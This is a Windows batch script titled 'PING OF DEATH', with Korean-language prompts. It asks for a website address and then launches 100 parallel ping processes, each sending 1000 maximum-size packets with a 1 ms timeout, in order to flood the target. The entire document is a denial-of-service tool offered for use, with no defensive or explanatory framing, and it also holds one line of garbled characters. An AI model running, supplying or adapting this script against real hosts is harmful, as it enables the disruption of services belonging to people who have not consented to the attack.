@echo off
echo.
echo.
echo *** PING OF DEATH ***
echo.
echo 꽳뚫쀏쐟
echo.
echo.
echo 사이트 주소 입력...
echo.
set /p input= 입력 :
echo.
set times=100
FOR /L %%i IN (1,1,%times%) DO (
start ping %input% -l 65500 -n 1000 -w 1
)
echo 100번..
pause